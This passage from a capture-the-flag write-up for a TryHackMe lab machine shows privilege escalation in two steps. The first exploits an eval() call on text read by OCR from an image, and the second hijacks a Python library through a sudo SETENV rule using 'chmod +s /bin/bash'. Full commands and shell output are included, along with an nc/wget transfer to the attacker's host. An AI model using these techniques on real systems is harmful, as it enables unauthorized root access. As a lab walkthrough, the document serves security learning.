				NUM2 = int(input("\t\t\tEnter Number2 >> "))
				if OPTIONS2 == 1:
					TOTAL = add(NUM1,NUM2)
				if OPTIONS2 == 2:
					TOTAL = subtract(NUM1,NUM2)
				if OPTIONS2 == 3:
					TOTAL = multiply(NUM1,NUM2)
				if OPTIONS2 == 4:
					TOTAL = divide(NUM1,NUM2)
				print "\t\t\tTotal >> $",TOTAL
		if OPTIONS == 2:
			animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

			print "\r\t\t\t     Waiting to extract..."
			for i in range(len(animation)):
			    time.sleep(0.5)
			    sys.stdout.write("\r\t\t\t         " + animation[i % len(animation)])
			    sys.stdout.flush()

			LISTED = pytesseract.image_to_string(Image.open('payload.png')) 

			TOTAL = eval(LISTED)
			print "\n\n\t\t\tTotal >> $",TOTAL
		if OPTIONS == 3:
			credits()
	sys.exit(-1)
```

```shell
ramsey@unbaked:~$ sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
                                             
				      (
				       )
			          __..---..__
			      ,-='  /  |  \  `=-.
			     :--..___________..--;
	 		      \.,_____________,./
		 

██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗████████╗███████╗
██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝
██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║██║█████╗  ██╔██╗ ██║   ██║   ███████╗
██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██║  ██║██║██╔══╝  ██║╚██╗██║   ██║   ╚════██║
██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║███████╗██║ ╚████║   ██║   ███████║
╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝


			--------- WELCOME! ---------
			1. Calculator
			2. Easy Calculator
			3. Credits
			4. Exit
			----------------------------
			Enter Options >> 
```

Let's break it down:

- Option 1 is just a calculator, nothing weird
- **Option 2 is interesting, as it has an `eval()` sink (Dangerous function)**
- Option 3 is just showing the credits, nothing odd
- Option 4, well, exit the programme

**That being said, we should focus on option 2.**

After the animation is finished, it'll open image file `payload.png`, then using `pytesseract.image_to_string()` method to extract image's text. **Finally, execute `eval()` function from the extracted image's text.**

**So, our souce (User input) is the `payload.png` image file, and the sink is `eval(LISTED)`.**

**Armed with above information, we can create an image that contains a malicious command!**

**But first, let's transfer the `payload.png`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|10:01:56]
└> nc -lnvp 4444 > payload.png
listening on [any] 4444 ...

ramsey@unbaked:~$ nc 10.9.0.253 4444 < payload.png
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113100302.png)

**Then, we can write a python script to test the payload:**
```py
#!/usr/bin/env python3

from PIL import Image
import pytesseract

LISTED = pytesseract.image_to_string(Image.open('payload.png'))

print(LISTED)
print(eval(LISTED))
```

```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|10:08:08]
└> python3 extract_string_from_image.py
2+2

4
```

Cool.

**Next, we can try to create an image that execute evil code:**

**`payload.png`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Unbaked-Pie/images/Pasted%20image%2020230113103856.png)

> Note: Since the `vuln.py` has imported `os` library, we can leverage that to spawn a Bash shell.

**Then, transfer our evil `payload.png`:**
```shell
┌[root♥siunam]-(~/ctf/thm/ctf/Unbaked-Pie)-[2023.01.13|10:16:45]
└> python3 -m http.server 80           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

ramsey@unbaked:~$ mv payload.png payload.png.bak
ramsey@unbaked:~$ wget http://10.9.0.253/payload.png
```

**After that, execute the payload:**
```shell
ramsey@unbaked:~$ sudo -u oliver /usr/bin/python /home/ramsey/vuln.py

--------- WELCOME! ---------
1. Calculator
2. Easy Calculator
3. Credits
4. Exit
----------------------------
Enter Options >> 2

Waiting to extract...
			         [■■■■■■■■■■]oliver@unbaked:~$ 
oliver@unbaked:~$ whoami;hostname;id;ip a
oliver
unbaked
uid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:9d:2a:2d:05:b3 brd ff:ff:ff:ff:ff:ff
    inet 10.10.49.15/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::9d:2aff:fe2d:5b3/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:40:ad:94:49 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:40ff:fead:9449/64 scope link 
       valid_lft forever preferred_lft forever
5: vethce88f61@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether ce:10:16:87:86:01 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::cc10:16ff:fe87:8601/64 scope link 
       valid_lft forever preferred_lft forever
oliver@unbaked:~$ 
```

> Note: The image must be very clear, otherwise it'll recognize other characters.

I'm user `oliver`!

### Host oliver to Host root

**Sudo permission:**
```shell
oliver@unbaked:~$ sudo -l
Matching Defaults entries for oliver on unbaked:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User oliver may run the following commands on unbaked:
    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
```

**User `oliver` can run `/usr/bin/python /opt/dockerScript.py` as root! Also, we can set an environment variable.**

**`/opt/dockerScript.py`:**
```py
import docker

# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
```

This Python script will: 

1. Using `docker.from_env()` to connect using the default socket or the configuration in the environment variable
2. Using `client.containers.run()` to run the specified container

**Armed with above information, we can hijack the `docker` library!**

**To do so, we can create an evil `docker` Python script:**
```shell
oliver@unbaked:/dev/shm$ cat << EOF > docker.py
> import os
> 
> os.system("chmod +s /bin/bash")
> EOF
```

This Python script will add a SUID sticky bit to `/bin/bash`, so we can spawn a root Bash shell.

**Then, run `/opt/dockerScript.py` with `PYTHON_PATH` environment variable:**
```shell
oliver@unbaked:/dev/shm$ sudo PYTHONPATH=/dev/shm /usr/bin/python /opt/dockerScript.py
Traceback (most recent call last):
  File "/opt/dockerScript.py", line 6, in <module>
    client = docker.from_env()
AttributeError: 'module' object has no attribute 'from_env'
```

```shell
oliver@unbaked:/dev/shm$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1014K Jul 13  2019 /bin/bash
```

**NIce! Our payload worked! Let's spawn a root Bash shell:**
```shell
oliver@unbaked:/dev/shm$ /bin/bash -p
bash-4.3# whoami;hostname;id;ip a
root
unbaked
uid=1002(oliver) gid=1002(oliver) euid=0(root) egid=0(root) groups=0(root),1002(oliver),1003(sysadmin)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:9d:2a:2d:05:b3 brd ff:ff:ff:ff:ff:ff
    inet 10.10.49.15/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::9d:2aff:fe2d:5b3/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:40:ad:94:49 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:40ff:fead:9449/64 scope link 
       valid_lft forever preferred_lft forever
5: vethce88f61@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether ce:10:16:87:86:01 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::cc10:16ff:fe87:8601/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```shell
bash-4.3# cat /root/root.txt
CONGRATS ON PWNING THIS BOX!
Created by ch4rm & H0j3n
ps: dont be mad us, we hope you learn something new

flag: THM{Redacted}
```

# Conclusion

What we've learned:

1. Enumerating Python Django Web Application via Debug Mode
2. Exploiting Insecure Deserialization In Python's Pickle Library
3. Using `nc` To Scan Open Ports
4. Port Forwarding via `chisel`
5. Docker Escape & Pivoting
6. Horizontal Privilege Escalation via Exploiting Unsantizized `eval()` Sink
7. Vertical Privilege Escalation via Hijacking Python Library With `SETENV` Sudo Permission